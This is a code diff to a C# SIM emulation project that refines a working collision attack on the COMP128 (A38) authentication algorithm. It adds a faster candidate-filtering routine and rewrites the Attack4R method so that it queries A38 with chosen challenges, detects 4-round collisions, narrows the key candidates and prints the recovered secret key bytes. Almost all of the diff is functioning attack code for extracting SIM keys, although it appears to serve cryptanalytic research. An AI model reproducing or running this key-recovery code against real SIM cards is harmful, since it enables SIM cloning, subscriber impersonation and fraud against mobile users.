@@ -1,4 +1,5 @@
 using System;
+using System.Linq;
 using System.Collections.Generic;
 using System.Text;
 using System.IO;
@@ -402,18 +403,82 @@ namespace SIMEmu
             }
             return r;
         }
+
+        //Return all possible ki quadruples whose 3R computation gives b at offset
+        //The trick is to undo 1 level 3 swap operation, the required result is just a cartesian product of 
+        //matching (K0,K8) and (K4, K12). Complexity reduced from 2^32 to 2^26
+        byte[,] get_candidates_from_3r_byte(int r0, int r4, int r8, int r12, int b, int offset)
+        {
+            List<int> r = new List<int>();
+            var R08 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r0, r8))).ToList();
+            var R412 = Enumerable.Range(0, 65536).Select(x => new KeyValuePair<int, int>(x, Comp128.Compute2R((x >> 8) &0xFF, x&0xFF, r4, r12))).ToList();
+            List<KeyValuePair<int, int>>[] filtered_R08 = new List<KeyValuePair<int, int>>[1 << 7];
+            List<KeyValuePair<int, int>>[] filtered_R412 = new List<KeyValuePair<int, int>>[1 << 7];
+            int shift_bits = (7 * (offset / 2));
+            for (int i = 0; i < (1 << 7); i++)
+            {
+                filtered_R08[i] = R08.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
+                filtered_R412[i] = R412.Where(x => i == ((x.Value >> shift_bits) & 0x7F)).ToList();
+            }
+
+            for (int a0 = 0; a0 < (1 << 7); a0++) //undo swap such that swap(a0,a1) => swap(b0, b1)
+                for (int a1 = 0; a1 < (1 << 7); a1++)
+                {
+                    int ta0 = a0, ta1 = a1;
+                    Comp128.swap(ref ta0, ref ta1, 2);
+                    if (   ((offset % 2 == 1) && (ta0 != b))  //a0 matches b if offset is odd
+                        || ((offset % 2 == 0) && (ta1 != b))  ) continue;
+                    //Now need to produce the cartesian product of K08 whose value at offset is a0, and K412 whose value at offset is a1
+                    foreach (var k08 in filtered_R08[a0])
+                        foreach (var k412 in filtered_R412[a1])
+                            r.Add((k08.Key << 16) | k412.Key);
+                }
+
+            byte[,] result = new byte[r.Count, 4];
+            int c = 0;
+            foreach (var x in r)
+            {
+                result[c, 0] = (byte)(x >> 24);
+                result[c, 1] = (byte)(x >> 8);
+                result[c, 2] = (byte)(x >> 16);
+                result[c, 3] = (byte)(x >> 0);
+                //var xx = Comp128.Compute3R(result[c, 0], result[c, 1], result[c, 2], result[c, 3], r0, r4, r8, r12);
+                //var y = ((int)(xx >> (6 * offset)) & 0x3F);
+                c++;
+            }
+            return result;
+            //long x;
+            //for (int k2 = 0; k2 <= 0xFF; k2++)
+            //    for (int k6 = 0; k6 <= 0xFF; k6++)
+            //    {
+            //        Console.Write(String.Format("\r {0}/65536", k2 * 256 + k6));
+            //        for (int k10 = 0; k10 <= 0xFF; k10++)
+            //            for (int k14 = 0; k14 <= 0xFF; k14++)
+            //            {
+            //                x = Comp128.Compute3R(k2, k6, k10, k14, r2, r6, r10, r14);
+            //                if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
+            //                    candidates.Add(new byte[] { (byte)k2, (byte)k6, (byte)k10, (byte)k14 });
+            //            }
+            //    }
+
+        }
         //By constructing appropriate 3R partial collisions, induce 4R collision probabilistically. 
         //If 4R collision is detected, one byte (6bits) of the state of the cipher after 3R can be determined.
         //By repeatedly obtaining these bytes, enough information is gathered to break k_(4i+2)
         public bool Attack4R(int k0, int k4, int k8, int k12)
         {
+            Console.WriteLine("4R Attack..");
             byte[] test_r = new byte[16];
             byte[] test_rst0 = new byte[12];
             byte[] test_rst1 = new byte[12];
             byte[] r0 = new byte[4];
             byte[] r1 = new byte[4];
-            List<byte[]> candidates = null;
-            for(int offset = 0;offset < 8; offset++)
+            byte[,] candidates = null;  //This can be huge (2^26). Need plain array to save memory.
+            Random prng = new Random();
+            int a38_count = 0;
+            for (int offset = 0; offset < 8; offset++)
+            {
+                Console.Write(String.Format("Trying 3RPC at offset {0}: ", offset));
                 foreach (var rpc in find_3rpc_pair(k0, k4, k8, k12, offset))
                 {
                     Unpack4Bytes((uint)rpc, ref r0[0], ref r0[1], ref r0[2], ref r0[3]);
@@ -422,61 +487,63 @@ namespace SIMEmu
                     long rr1 = Comp128.Compute3R(k0, k4, k8, k12, r1[0], r1[1], r1[2], r1[3]);
                     int intermediate_r = is_usable_4RCollision((int)(rr0 >> (6 * offset)) & 0x3F, (int)(rr1 >> (6 * offset)) & 0x3F);
                     if (intermediate_r < 0) continue;
-                    for (int c = 0; c < 2*(1 << 6); c++) //Find 4R collision probabilistically with p = 1/(1<<6)
+                    Console.Write(".");
+                    for (int c = 0; c < (1 << 10); c++) //Try to obtain 4R collision probabilistically with p = 1/(1<<6)
                     {
-                        (new Random()).NextBytes(test_r);
+                        prng.NextBytes(test_r);
                         Unpack4Bytes((uint)rpc, ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                         comp128.A38(test_r, test_rst0);
                         Unpack4Bytes((uint)(rpc >> 32), ref test_r[kid], ref test_r[kid + 4], ref test_r[kid + 8], ref test_r[kid + 12]);
                         comp128.A38(test_r, test_rst1);
+                        a38_count += 2;
                         bool collide = (Pack8Bytes(test_rst0) == Pack8Bytes(test_rst1));
                         if (collide) //Obtain 6 bits of information, time to bruteforce.
                         {
+                            Console.WriteLine(String.Format("Found 4R collision after {0} A38 invocations.", a38_count));
+                            a38_count = 0;
                             byte r2 = test_r[kid + 2], r6 = test_r[kid + 6], r10 = test_r[kid + 10], r14 = test_r[kid + 14];
                             //long x = Comp128.Compute3R(0xAA, 0x9F, 0x05, 0x28, test_r[kid + 2], test_r[kid + 6], test_r[kid + 10], test_r[kid + 14]);
                             //int y = (int)(x >> (6 * offset)) & 0x3F;
                             if (candidates == null) //First time is slow
                             {
-                                Console.WriteLine("Starting brute force:");
-                                candidates = new List<byte[]>();
-                                long x;
-                                for (int k2 = 0; k2 <= 0xFF; k2++)
-                                    for (int k6 = 0; k6 <= 0xFF; k6++)
-                                    {
-                                        Console.Write(String.Format("\r {0}/65536", k2 * 256 + k6));
-                                        for (int k10 = 0; k10 <= 0xFF; k10++)
-                                            for (int k14 = 0; k14 <= 0xFF; k14++)
-                                            {
-                                                x = Comp128.Compute3R(k2, k6, k10, k14, r2, r6, r10, r14);
-                                                if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
-                                                    candidates.Add(new byte[] { (byte)k2, (byte)k6, (byte)k10, (byte)k14 });
-                                            }
-                                    }
-                                Console.Write(String.Format("\n Obtained {0} candidates.", candidates.Count));
+                                candidates = get_candidates_from_3r_byte(r2, r6, r10, r14, intermediate_r, offset);
+                                Console.WriteLine(String.Format("Obtained {0} candidates.", candidates.GetLength(0)));
                                 break;
                             }
                             else //Refine Candidates.
                             {
                                 Console.Write("Refining..");
                                 List<byte[]> c2 = new List<byte[]>();
-                                foreach (var k in candidates)
+                                for (int i = 0; i < candidates.GetLength(0); i++)
                                 {
-                                    long x = Comp128.Compute3R(k[0], k[1], k[2], k[3], r2, r6, r10, r14);
+                                    long x = Comp128.Compute3R(candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3], r2, r6, r10, r14);
                                     if (((int)(x >> (6 * offset)) & 0x3F) == intermediate_r)
-                                        c2.Add(new byte[] { k[0], k[1], k[2], k[3] });
+                                        c2.Add(new byte[] { candidates[i, 0], candidates[i, 1], candidates[i, 2], candidates[i, 3] });
                                 }
-                                candidates.Clear();
-                                candidates = c2;
-                                Console.Write(String.Format("Refined to {0} candidates.", candidates.Count));
-                                if (candidates.Count == 1)
+                                candidates = new byte[c2.Count, 4];
+                                int j = 0;
+                                foreach (var x in c2)
                                 {
-                                    Console.WriteLine(String.Format("4R Key: {0:x2} {1:x2} {2:x2} {3:x2}", candidates.GetEnumerator().Current));
-
+                                    candidates[j, 0] = x[0]; candidates[j, 1] = x[1]; candidates[j, 2] = x[2]; candidates[j, 3] = x[3];
+                                    j++;
+                                }
+                                Console.WriteLine(String.Format("Refined to {0} candidates.", candidates.GetLength(0)));
+                                if (candidates.GetLength(0) == 1)
+                                {
+                                    Console.WriteLine(String.Format("4R Key: {4:X2} {0:X2} {5:X2} {1:X2} {6:X2} {2:X2} {7:X2} {3:X2}",
+                                        new object[] { candidates[0, 0], candidates[0, 1], candidates[0, 2], candidates[0, 3], k0, k4, k8, k12 }));
+                                    return true;
+                                }
+                                else if (candidates.GetLength(0) == 0)
+                                {
+                                    Console.WriteLine("4R Attack failed!");
+                                    return false;
                                 }
                             }
                         }
                     }
                 }
+            }
             return true;
         }
         public void Collect()
